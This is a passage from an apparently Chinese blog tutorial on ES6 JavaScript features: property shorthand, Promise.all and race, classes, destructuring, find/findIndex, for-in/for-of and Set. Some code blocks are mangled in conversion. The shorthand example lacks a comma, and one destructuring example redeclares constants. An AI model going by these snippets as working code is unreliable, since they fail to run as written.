<span class="keyword">return</span> pre</span><br><span class="line">&#125;, &#123;&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(totalObj) <span class="comment">// &#123; &#x27;林三心&#x27;: 3, sunshine_lin: 1, &#x27;科比&#x27;: 1 &#125;</span></span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="14、对象属性同名简写"><a href="#14、对象属性同名简写" class="headerlink" title="14、对象属性同名简写"></a>14、对象属性同名简写</h3><p>以前同名属性需要这么写</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="string">&#x27;林三心&#x27;</span></span><br><span class="line"><span class="keyword">const</span> age = <span class="string">&#x27;22&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  name: name,</span><br><span class="line">  age: age</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(obj) <span class="comment">// &#123; name: &#x27;林三心&#x27;, age: &#x27;22&#x27; &#125;</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>ES6新增语法，只需这么写</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="string">&#x27;林三心&#x27;</span></span><br><span class="line"><span class="keyword">const</span> age = <span class="string">&#x27;22&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 属性同名可简写</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  name</span><br><span class="line">  age</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(obj) <span class="comment">// &#123; name: &#x27;林三心&#x27;, age: &#x27;22&#x27; &#125;</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="15、Promise"><a href="#15、Promise" class="headerlink" title="15、Promise"></a>15、Promise</h3><p><code>Promise</code>，中文名为<code>承诺</code>，承诺在哪呢？承诺在，一旦他的状态改变，就不会再改。这里就介绍基本使用，如果想要深入理解如何使用，请看我的另一篇文章<a href="https://juejin.cn/post/6994594642280857630">看了就会，手写Promise原理，最通俗易懂的版本！！！</a></p><p>看看基本使用</p><ul><li>成功状态</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">requestData</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 模拟请求</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      resolve(<span class="string">&#x27;林三心&#x27;</span>)</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requestData().then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(res) <span class="comment">// 一秒钟后输出 &#x27;林三心&#x27;</span></span><br><span class="line">&#125;, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(err)</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br></pre></td></tr></table></figure><ul><li>失败状态</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">requestData</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 模拟请求</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      reject(<span class="string">&#x27;错误啦&#x27;</span>)</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requestData().then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(res)</span><br><span class="line">&#125;, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(err) <span class="comment">// 一秒钟后输出 &#x27;错误啦&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"> </span><br></pre></td></tr></table></figure><ul><li><p>```<br>all</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  方法</span><br><span class="line"></span><br><span class="line">  - 接收一个Promise数组，数组中如有非Promise项，则此项当做成功</span><br><span class="line">  - 如果所有Promise都成功，则返回成功结果数组</span><br><span class="line">  - 如果有一个Promise失败，则返回这个失败结果</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;js</span><br><span class="line">&#x2F;&#x2F; 如果全都为成功</span><br><span class="line">function fn(time) &#123;</span><br><span class="line">  return new Promise((resolve, reject) &#x3D;&gt; &#123;</span><br><span class="line">    console.log(88)</span><br><span class="line">    setTimeout(() &#x3D;&gt; &#123;</span><br><span class="line">      resolve(&#96;$&#123;time&#125;毫秒后我成功啦！！！&#96;)</span><br><span class="line">    &#125;, time)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Promise.all([fn(2000), fn(3000), fn(1000)]).then(res &#x3D;&gt; &#123;</span><br><span class="line">  &#x2F;&#x2F; 3秒后输出 [ &#39;2000毫秒后我成功啦！！！&#39;, &#39;3000毫秒后我成功啦！！！&#39;, &#39;1000毫秒后我成功啦！！！&#39; ]</span><br><span class="line">  console.log(res) </span><br><span class="line">&#125;, err &#x3D;&gt; &#123;</span><br><span class="line">  console.log(err)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 如果有一个失败</span><br><span class="line">function fn(time, isResolve) &#123;</span><br><span class="line">  return new Promise((resolve, reject) &#x3D;&gt; &#123;</span><br><span class="line">    setTimeout(() &#x3D;&gt; &#123;</span><br><span class="line">      isResolve ? resolve(&#96;$&#123;time&#125;毫秒后我成功啦！！！&#96;) : reject(&#96;$&#123;time&#125;毫秒后我失败啦！！！&#96;)</span><br><span class="line">    &#125;, time)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Promise.all([fn(2000, true), fn(3000), fn(1000, true)]).then(res &#x3D;&gt; &#123;</span><br><span class="line">  console.log(res)</span><br><span class="line">&#125;, err &#x3D;&gt; &#123;</span><br><span class="line">  console.log(err) &#x2F;&#x2F; 3秒后输出 &#39;3000毫秒后我失败啦！！！&#39;</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br></pre></td></tr></table></figure></li><li><p>```<br>race</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  方法</span><br><span class="line"></span><br><span class="line">  - 接收一个Promise数组，数组中如有非Promise项，则此项当做成功</span><br><span class="line">  - 哪个Promise最快得到结果，就返回那个结果，无论成功失败</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;js</span><br><span class="line">function fn(time, isResolve) &#123;</span><br><span class="line">  return new Promise((resolve, reject) &#x3D;&gt; &#123;</span><br><span class="line">    setTimeout(() &#x3D;&gt; &#123;</span><br><span class="line">      isResolve ? resolve(&#96;$&#123;time&#125;毫秒后我成功啦！！！&#96;) : reject(&#96;$&#123;time&#125;毫秒后我失败啦！！！&#96;)</span><br><span class="line">    &#125;, time)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Promise.race([fn(2000, true), fn(3000), fn(1000)]).then(res &#x3D;&gt; &#123;</span><br><span class="line">  console.log(res)</span><br><span class="line">&#125;, err &#x3D;&gt; &#123;</span><br><span class="line">  console.log(err) &#x2F;&#x2F; 1秒后输出</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br></pre></td></tr></table></figure></li></ul><h3 id="16、class"><a href="#16、class" class="headerlink" title="16、class"></a>16、class</h3><p>以前咱们使用构造函数生成对象，这么做</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.name = name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype.sayName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> kobe = <span class="keyword">new</span> Person(<span class="string">&#x27;科比&#x27;</span>)</span><br><span class="line">kobe.sayName() <span class="comment">// 科比</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>而有了ES6的<code>class</code>可以这么做</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">name</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 构造器</span></span><br><span class="line">    <span class="built_in">this</span>.name = name</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">sayName</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.name)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> kobe = <span class="keyword">new</span> Person(<span class="string">&#x27;科比&#x27;</span>)</span><br><span class="line">kobe.sayName() <span class="comment">// 科比</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>值得一提的是，<code>class</code>本质也是<code>function</code>，<code>class</code>是<code>function</code>的<code>语法糖</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> Person) <span class="comment">// function</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>除了以上，还需要知道class的以下知识点</p><p>静态属性和静态方法，使用<code>static</code>定义的属性和方法只能class自己用，实例用不了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">name</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> age = <span class="number">22</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> <span class="function"><span class="title">fn</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;哈哈&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(Person.age) <span class="comment">// 22</span></span><br><span class="line">Person.fn() <span class="comment">// 哈哈</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sunshine_lin = <span class="keyword">new</span> Person(<span class="string">&#x27;林三心&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(sunshine_lin.age) <span class="comment">// undefined</span></span><br><span class="line">sunshine_lin.fn() <span class="comment">// fn is not a function</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p><code>extend</code>继承</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">name, age</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name</span><br><span class="line">    <span class="built_in">this</span>.age = age</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">say</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.name, <span class="built_in">this</span>.age)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cat = <span class="keyword">new</span> Cat(<span class="string">&#x27;ketty&#x27;</span>, <span class="number">5</span>) <span class="comment">// 继承了Animal的构造器</span></span><br><span class="line">cat.say() <span class="comment">// ketty 5</span></span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="17、解构赋值"><a href="#17、解构赋值" class="headerlink" title="17、解构赋值"></a>17、解构赋值</h3><p>以前想提取对象里的属性需要这么做</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  name: <span class="string">&#x27;林三心&#x27;</span>,</span><br><span class="line">  age: <span class="number">22</span>,</span><br><span class="line">  gender: <span class="string">&#x27;男&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> name = obj.name</span><br><span class="line"><span class="keyword">const</span> age = obj.age</span><br><span class="line"><span class="keyword">const</span> gender = obj.gender</span><br><span class="line"><span class="built_in">console</span>.log(name, age, gender) <span class="comment">// 林三心 22 男</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>ES6新增了解构赋值的语法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  name: <span class="string">&#x27;林三心&#x27;</span>,</span><br><span class="line">  age: <span class="number">22</span>,</span><br><span class="line">  gender: <span class="string">&#x27;男&#x27;</span>,</span><br><span class="line">  doing: &#123;</span><br><span class="line">    morning: <span class="string">&#x27;摸鱼&#x27;</span>,</span><br><span class="line">    afternoon: <span class="string">&#x27;摸鱼&#x27;</span>,</span><br><span class="line">    evening: <span class="string">&#x27;sleep&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; name, age, gender &#125; = obj</span><br><span class="line"><span class="built_in">console</span>.log(name, age, gender) <span class="comment">// 林三心 22 男</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解构重名</span></span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">name</span>: myname &#125; = obj</span><br><span class="line"><span class="built_in">console</span>.log(myname) <span class="comment">// 林三心</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 嵌套解构</span></span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">doing</span>: &#123; evening &#125; &#125; = obj</span><br><span class="line"><span class="built_in">console</span>.log(evening) <span class="comment">// sleep</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>也可以进行数组的解构</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [a, b, c] = arr</span><br><span class="line"><span class="built_in">console</span>.log(a, b, c) <span class="comment">// 1 2 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认赋值</span></span><br><span class="line"><span class="keyword">const</span> [a, b, c, d = <span class="number">5</span>] = arr</span><br><span class="line"><span class="built_in">console</span>.log(a, b, c, d) <span class="comment">// 1 2 3 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 乱序解构</span></span><br><span class="line"><span class="keyword">const</span> &#123; <span class="number">1</span>: a, <span class="number">0</span>: b, <span class="number">2</span>: c &#125; = arr</span><br><span class="line"><span class="built_in">console</span>.log(a, b, c) <span class="comment">// 2 1 3</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="18、find-和-findIndex"><a href="#18、find-和-findIndex" class="headerlink" title="18、find 和 findIndex"></a>18、find 和 findIndex</h3><ul><li>find：找到返回被找元素，找不到返回undefined</li><li>findIndex：找到返回被找元素索引，找不到返回-1</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const findArr &#x3D; [</span><br><span class="line">  &#123; name: &#39;科比&#39;, no: &#39;24&#39; &#125;,</span><br><span class="line">  &#123; name: &#39;罗斯&#39;, no: &#39;1&#39; &#125;,</span><br><span class="line">  &#123; name: &#39;利拉德&#39;, no: &#39;0&#39; &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">const kobe &#x3D; findArr.find((&#123; name &#125;) &#x3D;&gt; name &#x3D;&#x3D;&#x3D; &#39;科比&#39;)</span><br><span class="line">const kobeIndex &#x3D; findArr.findIndex((&#123; name &#125;) &#x3D;&gt; name &#x3D;&#x3D;&#x3D; &#39;科比&#39;)</span><br><span class="line">console.log(kobe) &#x2F;&#x2F; &#123; name: &#39;科比&#39;, no: &#39;24&#39; &#125;</span><br><span class="line">console.log(kobeIndex) &#x2F;&#x2F; 0</span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="19、for-of-和-for-in"><a href="#19、for-of-和-for-in" class="headerlink" title="19、for of 和 for in"></a>19、for of 和 for in</h3><ul><li>for in ：遍历方法，可遍历对象和数组</li><li>for of ：遍历方法，只能遍历数组，不能遍历对象</li></ul><p>先看for in：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123; <span class="attr">name</span>: <span class="string">&#x27;林三心&#x27;</span>, <span class="attr">age</span>: <span class="number">22</span>, <span class="attr">gender</span>: <span class="string">&#x27;男&#x27;</span> &#125;</span><br><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key)</span><br><span class="line">&#125;</span><br><span class="line">name</span><br><span class="line">age</span><br><span class="line">gender</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> index <span class="keyword">in</span> arr) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(index)</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>再看 for of：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> item <span class="keyword">of</span> arr) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(item)</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="20、Set-和-Map"><a href="#20、Set-和-Map" class="headerlink" title="20、Set 和 Map"></a>20、Set 和 Map</h3><ul><li>Set</li></ul><p>先说说<code>Set</code>的基本用法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可不传数组</span></span><br><span class="line"><span class="keyword">const</span> set1 = <span class="keyword">new</span> <span class="built_in">Set</span>()</span><br><span class="line">set1.add(<span class="number">1</span>)</span><br><span class="line">set1.add(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">console</span>.log(set1) <span class="comment">// Set(2) &#123; 1, 2 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可传数组</span></span><br><span class="line"><span class="keyword">const</span> set2 = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="comment">// 增加元素 使用 add</span></span><br><span class="line">set2.add(<span class="number">4</span>)</span><br><span class="line">set2.add(<span class="string">&#x27;林三心&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(set2) <span class="comment">// Set(5) &#123; 1, 2, 3, 4, &#x27;林三心&#x27; &#125;</span></span><br><span class="line"><span class="comment">// 是否含有某个元素 使用 has</span></span><br><span class="line"><span class="built_in">console</span>.log(set2.has(<span class="number">2</span>)) <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 查看长度 使用 size</span></span><br><span class="line"><span class="built_in">console</span>.log(set2.size) <span class="comment">// 5</span></span><br><span class="line"><span class="comment">// 删除元素 使用 delete</span></span><br><span class="line">set2.delete(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">console</span>.log(set2) <span class="comment">// Set(4) &#123; 1, 3, 4, &#x27;林三心&#x27; &#125;</span></span><br></pre></td></tr></table></figure><p>再说说<code>Set</code>的不重复性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 增加一个已有元素，则增加无效，会被自动去重</span></span><br><span class="line"><span class="keyword">const</span> set1 = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>])</span><br><span class="line">set1.add(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">console</span>.log(set1) <span class="comment">// Set(1) &#123; 1 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 传入的数组中有重复项，会自动去重</span></span><br><span class="line"><span class="keyword">const</span> set2 = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="string">&#x27;林三心&#x27;</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="string">&#x27;林三心&#x27;</span>])</span><br><span class="line"><span class="built_in">console</span>.log(set2) <span class="comment">// Set(4) &#123; 1, 2, &#x27;林三心&#x27;, 3 &#125;</span></span><br><span class="line"><span class="built_in">Set</span><span class="string">`的不重复性中，要注意`</span>引用数据类型和<span class="literal">NaN</span></span><br><span class="line"><span class="comment">// 两个对象都是不用的指针，所以没法去重</span></span><br><span class="line"><span class="keyword">const</span> set1 = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, &#123;<span class="attr">name</span>: <span class="string">&#x27;林三心&#x27;</span>&#125;, <span class="number">2</span>, &#123;<span class="attr">name</span>: <span class="string">&#x27;林三心&#x27;</span>&#125;])</span><br><span class="line"><span class="built_in">console</span>.log(set1) <span class="comment">// Set(4) &#123; 1, &#123; name: &#x27;林三心&#x27; &#125;, 2, &#123; name: &#x27;林三心&#x27; &#125; &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果是两个对象是同一指针，则能去重</span></span><br><span class="line"><span class="keyword">const</span> obj 